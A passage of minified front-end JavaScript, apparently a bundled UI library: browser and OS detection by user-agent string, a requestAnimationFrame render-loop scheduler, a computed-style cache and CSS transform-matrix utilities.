Array&&function(t,e){t.__proto__=e}||function(t,e){for(var i in e)e.hasOwnProperty(i)&&(t[i]=e[i])})(e,i)};return function(e,i){function r(){this.constructor=e}t(e,i),e.prototype=null===i?Object.create(i):(r.prototype=i.prototype,new r)}}(),ka=function(t){function e(){return null!==t&&t.apply(this,arguments)||this}return C$(e,t),e.name_="Edge",e.uaidsWithOffsets_=[["Edge",[["Edge",5]]]],e}(Gr),T$=function(){var t=function(e,i){return(t=Object.setPrototypeOf||{__proto__:[]}instanceof Array&&function(t,e){t.__proto__=e}||function(t,e){for(var i in e)e.hasOwnProperty(i)&&(t[i]=e[i])})(e,i)};return function(e,i){function r(){this.constructor=e}t(e,i),e.prototype=null===i?Object.create(i):(r.prototype=i.prototype,new r)}}(),Fb=function(t){function e(){return null!==t&&t.apply(this,arguments)||this}return T$(e,t),e.name_="Opera",e.uaidsWithOffsets_=[["Opera",[["Version",8],["Opera",6]]],["OPR",[["OPR",4]]]],e}(Gr),lt=function(){function t(){}return t.getAsCSSModifier=function(){return this.name_.toLowerCase().replace(/\s/,"-")},t.isCurrentOS=function(){return this.regex_.test(vi)},t}(),x$=function(){var t=function(e,i){return(t=Object.setPrototypeOf||{__proto__:[]}instanceof Array&&function(t,e){t.__proto__=e}||function(t,e){for(var i in e)e.hasOwnProperty(i)&&(t[i]=e[i])})(e,i)};return function(e,i){function r(){this.constructor=e}t(e,i),e.prototype=null===i?Object.create(i):(r.prototype=i.prototype,new r)}}(),Nb=function(t){function e(){return null!==t&&t.apply(this,arguments)||this}return x$(e,t),e.name_="Windows 8.1",e.regex_=/(Windows 8.1|Windows NT 6.3)/,e}(lt),I$=function(){var t=function(e,i){return(t=Object.setPrototypeOf||{__proto__:[]}instanceof Array&&function(t,e){t.__proto__=e}||function(t,e){for(var i in e)e.hasOwnProperty(i)&&(t[i]=e[i])})(e,i)};return function(e,i){function r(){this.constructor=e}t(e,i),e.prototype=null===i?Object.create(i):(r.prototype=i.prototype,new r)}}(),Vb=function(t){function e(){return null!==t&&t.apply(this,arguments)||this}return I$(e,t),e.name_="Windows Server 2003",e.regex_=/Windows NT 5.2/,e}(lt),P$=function(){var t=function(e,i){return(t=Object.setPrototypeOf||{__proto__:[]}instanceof Array&&function(t,e){t.__proto__=e}||function(t,e){for(var i in e)e.hasOwnProperty(i)&&(t[i]=e[i])})(e,i)};return function(e,i){function r(){this.constructor=e}t(e,i),e.prototype=null===i?Object.create(i):(r.prototype=i.prototype,new r)}}(),qb=function(t){function e(){return null!==t&&t.apply(this,arguments)||this}return P$(e,t),e.name_="Windows Vista",e.regex_=/Windows NT 6.0/,e}(lt),O$=function(){var t=function(e,i){return(t=Object.setPrototypeOf||{__proto__:[]}instanceof Array&&function(t,e){t.__proto__=e}||function(t,e){for(var i in e)e.hasOwnProperty(i)&&(t[i]=e[i])})(e,i)};return function(e,i){function r(){this.constructor=e}t(e,i),e.prototype=null===i?Object.create(i):(r.prototype=i.prototype,new r)}}(),Bb=function(t){function e(){return null!==t&&t.apply(this,arguments)||this}return O$(e,t),e.name_="Windows XP",e.regex_=/(Windows NT 5.1|Windows XP)/,e}(lt),R$=function(){var t=function(e,i){return(t=Object.setPrototypeOf||{__proto__:[]}instanceof Array&&function(t,e){t.__proto__=e}||function(t,e){for(var i in e)e.hasOwnProperty(i)&&(t[i]=e[i])})(e,i)};return function(e,i){function r(){this.constructor=e}t(e,i),e.prototype=null===i?Object.create(i):(r.prototype=i.prototype,new r)}}(),Wb=function(t){function e(){return null!==t&&t.apply(this,arguments)||this}return R$(e,t),e.name_="Windows ME",e.regex_=/(Win 9x 4.90|Windows ME)/,e}(lt),M$=function(){var t=function(e,i){return(t=Object.setPrototypeOf||{__proto__:[]}instanceof Array&&function(t,e){t.__proto__=e}||function(t,e){for(var i in e)e.hasOwnProperty(i)&&(t[i]=e[i])})(e,i)};return function(e,i){function r(){this.constructor=e}t(e,i),e.prototype=null===i?Object.create(i):(r.prototype=i.prototype,new r)}}(),Ub=function(t){function e(){return null!==t&&t.apply(this,arguments)||this}return M$(e,t),e.name_="Windows 2000",e.regex_=/(Windows NT 5.0|Windows 2000)/,e}(lt),$$=function(){var t=function(e,i){return(t=Object.setPrototypeOf||{__proto__:[]}instanceof Array&&function(t,e){t.__proto__=e}||function(t,e){for(var i in e)e.hasOwnProperty(i)&&(t[i]=e[i])})(e,i)};return function(e,i){function r(){this.constructor=e}t(e,i),e.prototype=null===i?Object.create(i):(r.prototype=i.prototype,new r)}}(),Hb=function(t){function e(){return null!==t&&t.apply(this,arguments)||this}return $$(e,t),e.name_="Windows 98",e.regex_=/(Windows 98|Win98)/,e}(lt),L$=function(){var t=function(e,i){return(t=Object.setPrototypeOf||{__proto__:[]}instanceof Array&&function(t,e){t.__proto__=e}||function(t,e){for(var i in e)e.hasOwnProperty(i)&&(t[i]=e[i])})(e,i)};return function(e,i){function r(){this.constructor=e}t(e,i),e.prototype=null===i?Object.create(i):(r.prototype=i.prototype,new r)}}(),Gb=function(t){function e(){return null!==t&&t.apply(this,arguments)||this}return L$(e,t),e.name_="Windows 95",e.regex_=/(Windows 95|Win95|Windows_95)/,e}(lt),D$=function(){var t=function(e,i){return(t=Object.setPrototypeOf||{__proto__:[]}instanceof Array&&function(t,e){t.__proto__=e}||function(t,e){for(var i in e)e.hasOwnProperty(i)&&(t[i]=e[i])})(e,i)};return function(e,i){function r(){this.constructor=e}t(e,i),e.prototype=null===i?Object.create(i):(r.prototype=i.prototype,new r)}}(),zb=function(t){function e(){return null!==t&&t.apply(this,arguments)||this}return D$(e,t),e.name_="Windows 10",e.regex_=/(Windows 10.0|Windows NT 10.0)/,e}(lt),k$=function(){var t=function(e,i){return(t=Object.setPrototypeOf||{__proto__:[]}instanceof Array&&function(t,e){t.__proto__=e}||function(t,e){for(var i in e)e.hasOwnProperty(i)&&(t[i]=e[i])})(e,i)};return function(e,i){function r(){this.constructor=e}t(e,i),e.prototype=null===i?Object.create(i):(r.prototype=i.prototype,new r)}}(),jb=function(t){function e(){return null!==t&&t.apply(this,arguments)||this}return k$(e,t),e.name_="Windows 8",e.regex_=/(Windows 8|Windows NT 6.2)/,e}(lt),F$=function(){var t=function(e,i){return(t=Object.setPrototypeOf||{__proto__:[]}instanceof Array&&function(t,e){t.__proto__=e}||function(t,e){for(var i in e)e.hasOwnProperty(i)&&(t[i]=e[i])})(e,i)};return function(e,i){function r(){this.constructor=e}t(e,i),e.prototype=null===i?Object.create(i):(r.prototype=i.prototype,new r)}}(),Yb=function(t){function e(){return null!==t&&t.apply(this,arguments)||this}return F$(e,t),e.name_="Windows 7",e.regex_=/(Windows 7|Windows NT 6.1)/,e}(lt),N$=function(){var t=function(e,i){return(t=Object.setPrototypeOf||{__proto__:[]}instanceof Array&&function(t,e){t.__proto__=e}||function(t,e){for(var i in e)e.hasOwnProperty(i)&&(t[i]=e[i])})(e,i)};return function(e,i){function r(){this.constructor=e}t(e,i),e.prototype=null===i?Object.create(i):(r.prototype=i.prototype,new r)}}(),Xb=function(t){function e(){return null!==t&&t.apply(this,arguments)||this}return N$(e,t),e.name_="UNIX",e.regex_=/UNIX/,e}(lt),V$=function(){var t=function(e,i){return(t=Object.setPrototypeOf||{__proto__:[]}instanceof Array&&function(t,e){t.__proto__=e}||function(t,e){for(var i in e)e.hasOwnProperty(i)&&(t[i]=e[i])})(e,i)};return function(e,i){function r(){this.constructor=e}t(e,i),e.prototype=null===i?Object.create(i):(r.prototype=i.prototype,new r)}}(),Qb=function(t){function e(){return null!==t&&t.apply(this,arguments)||this}return V$(e,t),e.name_="Sun UserAgent",e.regex_=/SunOS/,e}(lt),q$=function(){var t=function(e,i){return(t=Object.setPrototypeOf||{__proto__:[]}instanceof Array&&function(t,e){t.__proto__=e}||function(t,e){for(var i in e)e.hasOwnProperty(i)&&(t[i]=e[i])})(e,i)};return function(e,i){function r(){this.constructor=e}t(e,i),e.prototype=null===i?Object.create(i):(r.prototype=i.prototype,new r)}}(),Kb=function(t){function e(){return null!==t&&t.apply(this,arguments)||this}return q$(e,t),e.name_="QNX",e.regex_=/QNX/,e}(lt),B$=function(){var t=function(e,i){return(t=Object.setPrototypeOf||{__proto__:[]}instanceof Array&&function(t,e){t.__proto__=e}||function(t,e){for(var i in e)e.hasOwnProperty(i)&&(t[i]=e[i])})(e,i)};return function(e,i){function r(){this.constructor=e}t(e,i),e.prototype=null===i?Object.create(i):(r.prototype=i.prototype,new r)}}(),Zb=function(t){function e(){return null!==t&&t.apply(this,arguments)||this}return B$(e,t),e.name_="Mac UserAgent X",e.regex_=/Mac OS X/,e}(lt),W$=function(){var t=function(e,i){return(t=Object.setPrototypeOf||{__proto__:[]}instanceof Array&&function(t,e){t.__proto__=e}||function(t,e){for(var i in e)e.hasOwnProperty(i)&&(t[i]=e[i])})(e,i)};return function(e,i){function r(){this.constructor=e}t(e,i),e.prototype=null===i?Object.create(i):(r.prototype=i.prototype,new r)}}(),Jb=function(t){function e(){return null!==t&&t.apply(this,arguments)||this}return W$(e,t),e.name_="Open BSD",e.regex_=/OpenBSD/,e}(lt),U$=function(){var t=function(e,i){return(t=Object.setPrototypeOf||{__proto__:[]}instanceof Array&&function(t,e){t.__proto__=e}||function(t,e){for(var i in e)e.hasOwnProperty(i)&&(t[i]=e[i])})(e,i)};return function(e,i){function r(){this.constructor=e}t(e,i),e.prototype=null===i?Object.create(i):(r.prototype=i.prototype,new r)}}(),e0=function(t){function e(){return null!==t&&t.apply(this,arguments)||this}return U$(e,t),e.name_="Mac UserAgent",e.regex_=/(MacPPC|MacIntel|Mac_PowerPC|Macintosh)/,e}(lt),H$=function(){var t=function(e,i){return(t=Object.setPrototypeOf||{__proto__:[]}instanceof Array&&function(t,e){t.__proto__=e}||function(t,e){for(var i in e)e.hasOwnProperty(i)&&(t[i]=e[i])})(e,i)};return function(e,i){function r(){this.constructor=e}t(e,i),e.prototype=null===i?Object.create(i):(r.prototype=i.prototype,new r)}}(),t0=function(t){function e(){return null!==t&&t.apply(this,arguments)||this}return H$(e,t),e.name_="Linux",e.regex_=/(Linux|X11)/,e}(lt),G$=function(){var t=function(e,i){return(t=Object.setPrototypeOf||{__proto__:[]}instanceof Array&&function(t,e){t.__proto__=e}||function(t,e){for(var i in e)e.hasOwnProperty(i)&&(t[i]=e[i])})(e,i)};return function(e,i){function r(){this.constructor=e}t(e,i),e.prototype=null===i?Object.create(i):(r.prototype=i.prototype,new r)}}(),r0=function(t){function e(){return null!==t&&t.apply(this,arguments)||this}return G$(e,t),e.name_="iOS",e.regex_=/(iPhone|iPad|iPod)/,e}(lt),z$=function(){var t=function(e,i){return(t=Object.setPrototypeOf||{__proto__:[]}instanceof Array&&function(t,e){t.__proto__=e}||function(t,e){for(var i in e)e.hasOwnProperty(i)&&(t[i]=e[i])})(e,i)};return function(e,i){function r(){this.constructor=e}t(e,i),e.prototype=null===i?Object.create(i):(r.prototype=i.prototype,new r)}}(),i0=function(t){function e(){return null!==t&&t.apply(this,arguments)||this}return z$(e,t),e.name_="BeOS",e.regex_=/BeOS/,e}(lt),j$=function(){var t=function(e,i){return(t=Object.setPrototypeOf||{__proto__:[]}instanceof Array&&function(t,e){t.__proto__=e}||function(t,e){for(var i in e)e.hasOwnProperty(i)&&(t[i]=e[i])})(e,i)};return function(e,i){function r(){this.constructor=e}t(e,i),e.prototype=null===i?Object.create(i):(r.prototype=i.prototype,new r)}}(),n0=function(t){function e(){return null!==t&&t.apply(this,arguments)||this}return j$(e,t),e.name_="Android",e.regex_=/Android/,e}(lt),Y$=function(){var t=function(e,i){return(t=Object.setPrototypeOf||{__proto__:[]}instanceof Array&&function(t,e){t.__proto__=e}||function(t,e){for(var i in e)e.hasOwnProperty(i)&&(t[i]=e[i])})(e,i)};return function(e,i){function r(){this.constructor=e}t(e,i),e.prototype=null===i?Object.create(i):(r.prototype=i.prototype,new r)}}(),s0=function(t){function e(){return null!==t&&t.apply(this,arguments)||this}return Y$(e,t),e.name_="UnknownBrowser",e.uaidsWithOffsets_=[],e}(Gr),X$=function(){var t=function(e,i){return(t=Object.setPrototypeOf||{__proto__:[]}instanceof Array&&function(t,e){t.__proto__=e}||function(t,e){for(var i in e)e.hasOwnProperty(i)&&(t[i]=e[i])})(e,i)};return function(e,i){function r(){this.constructor=e}t(e,i),e.prototype=null===i?Object.create(i):(r.prototype=i.prototype,new r)}}(),o0=function(t){function e(){return null!==t&&t.apply(this,arguments)||this}return X$(e,t),e.name_="UnknownOS",e.regex_=/.*/,e}(lt),Q$=[Fb,ka,Dc,kb,Un,ki],K$=[n0,i0,r0,t0,e0,Jb,Zb,Kb,Qb,Xb,Yb,jb,Nb,zb,Gb,Hb,Ub,Wb,Vb,qb,Bb],Ed=null,Sd=null,Ad=null,Mr=function(){function t(){}return t.getScreenSize=function(){return window.screen?new sr(window.screen.width,window.screen.height):null},t.getBrowser=function(){if(null===Ed){var t=Q$.find((function(t){return t.isCurrentBrowser()}));Ed=mi(t)?t:s0}return Ed},t.isMobile=function(){return null===Ad&&(Ad=/Mobile|mini|Fennec|Android|iP(ad|od|hone)/.test(vi)),Ad},t.isCookieEnabled=function(){var t=!!window.navigator.cookieEnabled;return void 0!==navigator.cookieEnabled||t?t:(document.cookie="testcookie",-1!==document.cookie.indexOf("testcookie"))},t.getOS=function(){if(null===Sd){var t=K$.find((function(t){return t.isCurrentOS()}));Sd=mi(t)?t:o0}return Sd},t}(),a0=function(){function t(t){this.step_=t}return Object.defineProperty(t.prototype,"step",{get:function(){return this.step_},enumerable:!1,configurable:!0}),t}(),l0=new Set(["loaded","complete"]),at=function(){function t(){}return t.CLEANUP=Symbol("Cleanup"),t.FRAME_COUNT=Symbol("Frame Count"),t.MEASURE=Symbol("Measure"),t.PHYSICS=Symbol("Physics"),t.MUTATE=Symbol("Mutate"),t.PRE_MEASURE=Symbol("Pre-measure"),t.SCROLL_PRE_MEASURE=Symbol("Scroll-measure"),t.SCROLL_MEASURE=Symbol("Scroll-measure"),t.SCROLL_MUTATE=Symbol("Scroll-mutate"),t.SCROLL_CLEANUP=Symbol("Scroll-cleanup"),t.ANY_PRE_MEASURE=Symbol("Any-pre-measure"),t.ANY_MEASURE=Symbol("Any-measure"),t.ANY_MUTATE=Symbol("Any-mutate"),t.ANY_CLEANUP=Symbol("Any-cleanup"),t}(),Cd=Mr.getBrowser()!==Dc&&{passive:!0,capture:!1,once:!0},Td=[at.FRAME_COUNT,at.PRE_MEASURE,at.SCROLL_PRE_MEASURE,at.ANY_PRE_MEASURE,at.MEASURE,at.SCROLL_MEASURE,at.ANY_MEASURE,at.PHYSICS,at.MUTATE,at.SCROLL_MUTATE,at.ANY_MUTATE,at.CLEANUP,at.SCROLL_CLEANUP,at.ANY_CLEANUP],Z$=[at.FRAME_COUNT,at.PRE_MEASURE,at.ANY_PRE_MEASURE,at.MEASURE,at.ANY_MEASURE,at.PHYSICS,at.MUTATE,at.ANY_MUTATE,at.CLEANUP,at.ANY_CLEANUP],J$=[at.SCROLL_PRE_MEASURE,at.ANY_PRE_MEASURE,at.SCROLL_MEASURE,at.ANY_MEASURE,at.SCROLL_MUTATE,at.ANY_MUTATE,at.SCROLL_CLEANUP,at.ANY_CLEANUP],eL=function(){function t(t){this.rl_=t,this.ids_=new Set}return t.prototype.wrapFunction_=function(t,e){var i=this,r=t.bind(this.rl_)((function(){i.ids_.delete(r),e()}));return this.ids_.add(r),r},t.prototype.framecount=function(t){return this.wrapFunction_(this.rl_.framecount,t)},t.prototype.premeasure=function(t){return this.wrapFunction_(this.rl_.premeasure,t)},t.prototype.measure=function(t){return this.wrapFunction_(this.rl_.measure,t)},t.prototype.physics=function(t){return this.wrapFunction_(this.rl_.physics,t)},t.prototype.mutate=function(t){return this.wrapFunction_(this.rl_.mutate,t)},t.prototype.cleanup=function(t){return this.wrapFunction_(this.rl_.cleanup,t)},t.prototype.scrollPremeasure=function(t){return this.wrapFunction_(this.rl_.scrollPremeasure,t)},t.prototype.scrollMeasure=function(t){return this.wrapFunction_(this.rl_.scrollMeasure,t)},t.prototype.scrollMutate=function(t){return this.wrapFunction_(this.rl_.scrollMutate,t)},t.prototype.scrollCleanup=function(t){return this.wrapFunction_(this.rl_.scrollCleanup,t)},t.prototype.anyPremeasure=function(t){return this.wrapFunction_(this.rl_.anyPremeasure,t)},t.prototype.anyMeasure=function(t){return this.wrapFunction_(this.rl_.anyMeasure,t)},t.prototype.anyMutate=function(t){return this.wrapFunction_(this.rl_.anyMutate,t)},t.prototype.anyCleanup=function(t){return this.wrapFunction_(this.rl_.anyCleanup,t)},t.prototype.destroy=function(){var t=this;this.ids_.forEach((function(e){return t.rl_.clear(e)})),this.ids_.clear()},t}(),tL=function(){function t(){var t=this;this.scheduledFns_=new Map,this.lastRun_=performance.now(),this.runLoopCallback_=function(e){t.runLoopAndSetupFrameCallback_(e)},this.loaded_=l0.has(document.readyState),this.scrollHandler_=function(){window.removeEventListener("load",t.scrollHandler_),window.removeEventListener("scroll",t.scrollHandler_),window.removeEventListener("resize",t.scrollHandler_),t.runScrollLoopAndSetupListener_()},this.init_()}return t.prototype.init_=function(){var t=this;this.loaded_||window.addEventListener("load",(function(){return t.loaded_=!0})),Td.forEach((function(e){return t.scheduledFns_.set(e,new Map)})),this.runStepsInOrder_(Td),this.setupListeners_()},t.prototype.setupListeners_=function(){this.setupScrollListener_(),this.setupRequestAnimationFrame_()},t.prototype.setupRequestAnimationFrame_=function(){window.requestAnimationFrame(this.runLoopCallback_)},t.prototype.setupScrollListener_=function(){window.addEventListener("load",this.scrollHandler_,Cd),window.addEventListener("scroll",this.scrollHandler_,Cd),window.addEventListener("resize",this.scrollHandler_,Cd)},t.prototype.framecount=function(t){return this.addFnToStep_(t,at.FRAME_COUNT)},t.prototype.premeasure=function(t){return this.addFnToStep_(t,at.PRE_MEASURE)},t.prototype.measure=function(t){return this.addFnToStep_(t,at.MEASURE)},t.prototype.physics=function(t){return this.addFnToStep_(t,at.PHYSICS)},t.prototype.mutate=function(t){return this.addFnToStep_(t,at.MUTATE)},t.prototype.cleanup=function(t){return this.addFnToStep_(t,at.CLEANUP)},t.prototype.scrollPremeasure=function(t){return this.addFnToStep_(t,at.SCROLL_PRE_MEASURE)},t.prototype.scrollMeasure=function(t){return this.addFnToStep_(t,at.SCROLL_MEASURE)},t.prototype.scrollMutate=function(t){return this.addFnToStep_(t,at.SCROLL_MUTATE)},t.prototype.scrollCleanup=function(t){return this.addFnToStep_(t,at.SCROLL_CLEANUP)},t.prototype.anyPremeasure=function(t){return this.addFnToStep_(t,at.ANY_PRE_MEASURE)},t.prototype.anyMeasure=function(t){return this.addFnToStep_(t,at.ANY_MEASURE)},t.prototype.anyMutate=function(t){return this.addFnToStep_(t,at.ANY_MUTATE)},t.prototype.anyCleanup=function(t){return this.addFnToStep_(t,at.ANY_CLEANUP)},t.prototype.addFnToStep_=function(t,e){var i=new a0(e);return this.scheduledFns_.get(e).set(i,t),i},t.prototype.runLoop=function(t){void 0===t&&(t=null),this.currentRun_=t||performance.now(),this.runStepsInOrder_(this.loaded_?Z$:Td),this.lastRun_=this.currentRun_},t.prototype.runLoopAndSetupFrameCallback_=function(t){this.runLoop(t),this.setupRequestAnimationFrame_()},t.prototype.getElapsedMilliseconds=function(){return this.currentRun_-this.lastRun_},t.prototype.getElapsedSeconds=function(){return this.getElapsedMilliseconds()/1e3},t.prototype.runScrollLoop=function(){this.runStepsInOrder_(J$)},t.prototype.runScrollLoopAndSetupListener_=function(){this.runScrollLoop(),this.setupScrollListener_()},t.prototype.runStepsInOrder_=function(t){var e=this;t.forEach((function(t){return e.runFnsForStep_(t)}))},t.prototype.runFnsForStep_=function(t){for(var e,i=this.scheduledFns_.get(t).values();e=i.next().value;)e();this.scheduledFns_.set(t,new Map)},t.prototype.clear=function(t){this.scheduledFns_.get(t.step).delete(t)},t.getSingleton=function(){return t.singleton_=t.singleton_||new this},t.prototype.getDestroyableInstance=function(){return new eL(this)},t.prototype.getFps=function(){return 60},t.prototype.getTargetFrameLength=function(){return t.msPerFrame_},t.prototype.getMsPerFrame=function(){return t.msPerFrame_},t.prototype.setFps=function(){console.warn("DEPRECATED: RenderLoop support for custom frame-rates has been dropped. Defaulting to maximum FPS per browser. This is to reduce overhead inside the loop.")},t.singleton_=null,t.msPerFrame_=1e3/60,t}(),de=tL.getSingleton(),rL=function(){var t=function(e,i){return(t=Object.setPrototypeOf||{__proto__:[]}instanceof Array&&function(t,e){t.__proto__=e}||function(t,e){for(var i in e)e.hasOwnProperty(i)&&(t[i]=e[i])})(e,i)};return function(e,i){function r(){this.constructor=e}t(e,i),e.prototype=null===i?Object.create(i):(r.prototype=i.prototype,new r)}}(),Hn=function(t){function e(e,i,r){void 0===e&&(e=[]),void 0===i&&(i=Map),void 0===r&&(r=co);var n=t.call(this)||this;return n.replaceInnerMap(new Xe(e,i,r)),n}return rL(e,t),e.usingFunction=function(t){return new e([],Map,t)},e}(Di),ct=function(){function t(){this.throwHandler_=t.defaultThrowHandler_}return t.getSingleton=function(){return this.singleton_||(this.singleton_=new this)},t.throw=function(t){this.getSingleton().throw(t)},t.prototype.throw=function(t){this.throwHandler_(t)},t.prototype.overrideThrow=function(t){this.throwHandler_=t},t.prototype.getThrowHandler=function(){return this.throwHandler_},t.defaultThrowHandler_=function(t){throw new Error(t)},t.singleton_=null,t}(),kc=function(){for(var t=0,e=0,i=arguments.length;e<i;e++)t+=arguments[e].length;var r=Array(t),n=0;for(e=0;e<i;e++)for(var s=arguments[e],o=0,a=s.length;o<a;o++,n++)r[n]=s[o];return r},iL=2,xd=Xe.usingFunction((function(t){return Hn.usingFunction((function(e){return new(t.bind.apply(t,kc([void 0],e)))}))})),Id=Xe.usingFunction((function(){return new Set})),yi=function(){function t(t){void 0===t&&(t=null);for(var e=[],i=1;i<arguments.length;i++)e[i-1]=arguments[i];var r=xd.get(this.constructor);this.args_=kc([t],e),r.has(kc([t],e))&&(t?ct.throw("Please use getForElement instead of new."):ct.throw("Please use getSingleton instead of new.")),this.destroyTimeout_=null,this.destroyed_=!1,this.element=t,this.values=[this.getCurrentVector_()],this.init()}return t.prototype.getVectorClass=function(){return this.constructor.VectorClass},t.prototype.init=function(){var t=this;de.anyPremeasure((function(){return t.measureValues()})),this.render()},t.prototype.getLastValue=function(){return this.values.slice(-1)[0]},t.prototype.getValues=function(){return ct.throw("getValues must be overridden by child class"),[]},t.prototype.getCurrentVector_=function(){var t;return new((t=this.getVectorClass()).bind.apply(t,kc([void 0],this.getValues())))},t.prototype.getValueLimit_=function(){return this.constructor.VALUE_LIMIT},t.prototype.render=function(){var t=this;this.destroyed_||this.renderLoopPremeasure_((function(){t.renderLoopCleanup_((function(){return t.render()})),t.measureValues()}))},t.prototype.renderLoopCleanup_=function(t){de.anyCleanup(t)},t.prototype.renderLoopPremeasure_=function(t){de.anyPremeasure(t)},t.prototype.measureValues=function(){this.values=this.values.slice(-(this.getValueLimit_()-1)).concat([this.getCurrentVector_()])},t.prototype.getCurrentAndLastValue=function(){return this.values.slice(-2)},t.prototype.getDelta=function(){var t=this.getCurrentAndLastValue();return this.getVectorClass().subtract(t[0],t[1])},t.prototype.hasChanged=function(){var t;return!(t=this.getVectorClass()).areEqual.apply(t,this.getCurrentAndLastValue())},t.getForElement=function(t,e){void 0===e&&(e=[null]);var i=xd.get(this).get(e);return Id.get(i).add(t),i},t.getSingleton=function(t){return this.getForElement(t)},t.prototype.destroy=function(t){var e=this;Id.get(this).delete(t),clearTimeout(this.destroyTimeout_),this.destroyTimeout_=window.setTimeout((function(){Id.size<=0&&(xd.get(e.constructor).delete(e.args_),e.destroyed_=!0)}),1e3)},t.VectorClass=Wn,t.VALUE_LIMIT=iL,t}(),nL=function(){var t=function(e,i){return(t=Object.setPrototypeOf||{__proto__:[]}instanceof Array&&function(t,e){t.__proto__=e}||function(t,e){for(var i in e)e.hasOwnProperty(i)&&(t[i]=e[i])})(e,i)};return function(e,i){function r(){this.constructor=e}t(e,i),e.prototype=null===i?Object.create(i):(r.prototype=i.prototype,new r)}}(),ti=function(t){function e(e,i){void 0===e&&(e=[]),void 0===i&&(i=Map);var r=t.call(this,e,i)||this;return r.replaceInnerMap(new Xe(e,i,(function(t){return[]}))),r}return nL(e,t),e}(lo),Fc=function(){function t(){this.computedStyle_=Xe.usingFunction((function(t){return window.getComputedStyle(t)})),this.init_()}return t.prototype.init_=function(){this.renderLoop_()},t.prototype.getComputedStyle=function(t){return this.computedStyle_.get(t)},t.prototype.renderLoop_=function(){var t=this;de.anyMutate((function(){de.anyCleanup((function(){t.computedStyle_.clear(),t.renderLoop_()}))}))},t.getSingleton=function(){return this.singleton_=this.singleton_||new this},t.singleton_=null,t}();function c0(t,e,i){for(var r=i,n=t.next();!n.done;)r=e(r,n.value),n=t.next();return r}var sL=function(){for(var t=0,e=0,i=arguments.length;e<i;e++)t+=arguments[e].length;var r=Array(t),n=0;for(e=0;e<i;e++)for(var s=arguments[e],o=0,a=s.length;o<a;o++,n++)r[n]=s[o];return r},Nc=new ti,Pd=new Map,oL="matrix(",aL=oL.length,lL=Fc.getSingleton(),fo=function(){function t(t,e,i,r,n,s){void 0===t&&(t=1),void 0===e&&(e=0),void 0===i&&(i=0),void 0===r&&(r=1),void 0===n&&(n=0),void 0===s&&(s=0),this.a=parseFloat(t),this.b=parseFloat(e),this.c=parseFloat(i),this.d=parseFloat(r),this.tx=parseFloat(n),this.ty=parseFloat(s)}return Object.defineProperty(t.prototype,"translateX",{get:function(){return this.tx},enumerable:!1,configurable:!0}),Object.defineProperty(t.prototype,"translateY",{get:function(){return this.ty},enumerable:!1,configurable:!0}),t.prototype.getTranslateX=function(){return this.tx},t.prototype.getTranslateY=function(){return this.ty},t.prototype.translate=function(e){var i=this.tx+e.x,r=this.ty+e.y;return new t(this.a,this.b,this.c,this.d,i,r)},t.prototype.setPosition=function(e){return new t(this.a,this.b,this.c,this.d,e.x,e.y)},t.prototype.setTranslateX=function(e){return new t(this.a,this.b,this.c,this.d,e,this.ty)},t.prototype.setTranslateY=function(e){return new t(this.a,this.b,this.c,this.d,this.tx,e)},t.prototype.applyPositionConstraint=function(t){var e=t.constrain(new Je(this.tx,this.ty));return this.setPosition(e)},t.prototype.applyPositionConstraints=function(t){var e=t.reduce((function(t,e){return e.constrain(t)}),new Je(this.tx,this.ty));return this.setPosition(e)},t.prototype.applyPositionConstraintsFromIterableIterator=function(t){var e=c0(t,(function(t,e){return e.constrain(t)}),new Je(this.tx,this.ty));return this.setPosition(e)},t.prototype.set2dTranslation=function(e){return new t(this.a,this.b,this.c,this.d,e.x,e.y)},t.prototype.setScale=function(e){return new t(e,this.b,this.c,e,this.tx,this.ty)},t.parseFromString=function(e){return"none"!==e&&e.length?new(t.bind.apply(t,sL([void 0],e.slice(aL,-1).split(",")))):new t},t.fromElementTransform=function(e){return t.parseFromString(lL.getComputedStyle(e).transform)},t.prototype.toCSSString=function(){return"matrix("+[this.a,this.b,this.c,this.d,this.tx,this.ty].join(",")+")"},t.prototype.applyToElementTransform=function(t){t.style.transform=this.toCSSString()},t.prototype.applyToElementTransformAsChange=function(e,i){Nc.get(e).push(this.getDifference(i)),Pd.set(e,i),t.mutateElementWithMatrixChanges(e)},t.mutateElementWithMatrixChanges=function(t){de.mutate((function(){var e=Pd.get(t),i=Nc.get(t);i.length<1||(Nc.delete(t),i.reduce((function(t,e){return t.applyDifference(e)}),e).applyToElementTransform(t),de.cleanup((function(){Pd.clear(),Nc.clear()})))}))},t.prototype.applyDifference=function(e){return new t(this.a+e.a,this.b+e.b,this.c+e.c,this.d+e.d,this.tx+e.tx,this.ty+e.ty)},t.prototype.getDifference=function(e){return new t(this.a-e.a,this.b-e.b,this.c-e.c,this.d-e.d,this.tx-e.tx,this.ty-e.ty)},t}(),u0=Symbol("result"),cL=Xe.usingFunction((function(t){t!==u0&&console.error("Browser check function called in unusual way.");var e=document.createElement("div");e.style.display="table";var i=document.createElement("div");i.style.display="table-row",i.style.height="200px";var r=document.createElement("div");r.style.display="table-row",r.style.position="relative";var n=document.createElement("div");n.style.display="table-cell";var s=document.createElement("div");s.style.display="inline-block",s.style.height="100px",s.style.width="100px",e.appendChild(i),e.appendChild(r),r.appendChild(n),n.appendChild(s),document.body.appendChild(e);var o=r.offsetParent===e&&200===r.offsetTop&&n.offsetParent===r&&200===n.offsetTop&&s.offsetParent===r&&200===s.offsetTop;return document.body.removeChild(e),o}));function h0(){return cL.get(u0)}var uL=["table","table-cell","table-row"];function f0(t){return uo(uL.find((function(e){return t.style.display===e})))}function Od(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];return Math.max.apply(Math,t.map((function(t){return Math.abs(t)})))}var hL=function(){var t=function(e,i){return(t=Object.setPrototypeOf||{__proto__:[]}instanceof Array&&function(t,e){t.__proto__=e}||function(t,e){for(var i in e)e.hasOwnProperty(i)&&(t[i]=e[i])})(e,i)};return function(e,i){function r(){this.constructor=e}t(e,i),e.prototype=null===i?Object.create(i):(r.prototype=i.prototype,new r)}}(),fL=function(){for(var t=0,e=0,i=arguments.length;e<i;e++)t+=arguments[e].length;var r=Array(t),n=0;for(e=0;e<i;e++)for(var s=arguments[e],o=0,a=s.length;o<a;o++,n++)r[n]=s[o];return r},Je=function(t){function e(e,i){void 0===e&&(e=0),void 0===i&&(i=0);for(var r=[],n=2;n<arguments.length;n++)r[n-2]=arguments[n];return t.apply(this,fL([e,i],r))||this}return hL(e,t),Object.defineProperty(e.prototype,"x",{get:function(){return this.getValues()[0]},enumerable:!1,configurable:!0}),Object.defineProperty(e.prototype,"y",{get:function(){return this.getValues()[1]},enumerable:!1,configurable:!0}),e.prototype.getX=function(){return 